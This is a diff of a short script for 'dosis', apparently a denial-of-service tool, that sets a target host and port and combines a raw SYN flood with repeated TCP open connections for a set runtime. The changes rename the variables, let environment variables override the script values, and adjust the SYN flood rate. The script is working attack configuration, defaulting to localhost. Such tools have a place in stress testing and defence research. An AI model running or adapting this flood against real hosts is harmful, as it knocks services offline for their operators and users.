@@ -4,10 +4,14 @@
 # TCP open connections.
 #
 # Configuration:
-#  THOST   - target host
-#  TPORT   - target port
-#  THREADS - number of threads
+#  THOST   - target host address
+#  TPORT   - target host port
+#  SRT     - SYN flood runtime
 #  RT      - total runtime (in seconds)
+#
+#   NOTE: vars declared previously as environment variables won't be
+#         overwritten by script values. If you want that values on script take
+#         precedence over env vars, remove the preceeding ?.
 #
 # -----------------------------------------------------------------------------
 # dosis - DoS: Internet Sodomizer
@@ -30,16 +34,15 @@
 ###############################################################################
 
 # configuration
-THOST="127.0.0.1"
-#THOST="192.168.2.1"
-TPORT="80"
-SD="2.0"
-RT="10.0"
+? THOST="127.0.0.1"
+? TPORT="80"
+? SRT="10.0"
+? RT="20.0"
 
 # script
 0.0 ON 1 LISTEN
-0.0 ON 2 TCP RAW DST $THOST $TPORT FLAGS S PAYLOAD RANDOM(1) PERIODIC 10000.0
+0.0 ON 2 TCP RAW DST $THOST $TPORT FLAGS S PERIODIC [ 1.0 ]
 0.0 ON 3 TCP OPEN DST $THOST $TPORT PAYLOAD FILE("tcpopen.payload")
-$SD OFF 2
+$SRT OFF 2
 $RT OFF *
 
